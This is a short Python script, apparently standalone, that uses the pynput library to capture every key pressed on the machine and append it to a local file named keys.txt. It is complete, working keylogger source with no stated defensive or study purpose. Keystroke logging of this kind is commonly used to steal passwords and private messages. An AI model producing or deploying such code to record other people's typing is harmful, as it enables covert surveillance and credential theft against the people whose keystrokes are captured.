from pynput import keyboard

def log(key):
    with open("keys.txt", "a") as f:
        f.write(str(key) + "\n")

with keyboard.Listener(on_press=log) as listener:
    listener.join()
